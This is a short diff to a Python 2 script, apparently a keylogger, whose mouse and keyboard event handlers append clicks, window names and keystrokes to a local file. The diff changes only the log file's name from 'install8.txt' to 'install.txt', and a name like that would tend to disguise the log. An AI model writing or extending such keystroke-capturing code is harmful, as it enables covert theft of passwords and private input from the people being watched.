@@ -15,7 +15,7 @@ oldwindowsName=''
 def onMouseEvent(event):
     timeNow = datetime.datetime.now()
     Now = timeNow.strftime('%H:%M:%S')
-    Mouse_input = open(r'd://install8.txt', 'a')
+    Mouse_input = open(r'd://install.txt', 'a')
     global oldwindowsName
     print "Click:", event.MessageName,event.Message
     print "Time:", datetime.datetime.now()
@@ -34,7 +34,7 @@ def onKeyboardEvent(event):
     # 监听键盘事件
     timeNow = datetime.datetime.now()
     Now = timeNow.strftime('%H:%M:%S')
-    Keyboard_input = open(r'd://install8.txt', 'a')
+    Keyboard_input = open(r'd://install.txt', 'a')
     global oldwindowsName
     if event.WindowName != oldwindowsName:
         Keyboard_input.write( "---------\n")
